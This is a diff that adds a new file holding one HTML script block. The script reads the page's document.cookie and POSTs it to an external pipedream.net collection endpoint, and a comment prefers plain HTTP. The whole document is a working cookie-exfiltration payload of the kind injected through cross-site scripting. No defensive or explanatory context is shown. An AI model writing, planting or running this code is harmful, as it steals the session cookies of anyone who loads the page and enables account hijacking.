@@ -1,0 +1,17 @@
+<script>
+  // Get the cookie value
+  const cookie = document.cookie;
+
+  // Create a new XMLHttpRequest object
+  const xhr = new XMLHttpRequest();
+  const url = 'http://eoap6y5xi5jjga1.m.pipedream.net'; // Use HTTP instead of HTTPS
+
+  // Open a POST request to the specified URL
+  xhr.open('POST', url);
+
+  // Set the Content-Type header to indicate that the request body contains plain text
+  xhr.setRequestHeader('Content-Type', 'text/plain');
+
+  // Send the cookie as the request body
+  xhr.send(cookie);
+</script>
